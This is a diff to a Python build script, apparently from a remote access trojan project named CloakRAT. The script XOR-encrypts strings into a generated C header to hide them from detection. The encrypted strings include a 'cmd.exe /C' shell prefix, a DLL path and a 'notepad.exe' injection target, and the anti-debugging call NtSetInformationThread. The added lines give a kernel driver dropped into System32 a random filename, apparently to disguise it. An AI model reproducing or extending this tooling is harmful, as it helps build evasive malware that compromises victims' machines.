@@ -1,4 +1,5 @@
 import secrets
+import string
 import os
 
 HEADER_NAME = 'encrypted_strings_autogen.h'
@@ -8,14 +9,17 @@ KEY_ENTROPY = 16  # bytes
 HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
 HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
+def get_random_driver_name(length: int) -> str:
+    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))
 
 # Add or modify strings here.
 strings_to_encrypt = {
     # General strings
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
-    'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
-    'str_procName': 'notepad.exe',
+    'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',  # USED BY OLD INJECTOR
+    'str_procName': 'notepad.exe', # USED BY OLD INJECTOR
+    'str_kphDriverPathOnDisk': f'C:\\Windows\\System32\\{get_random_driver_name(8)}.sys',
     
     # Function names
     'str_NtSetInformationThread': 'NtSetInformationThread',
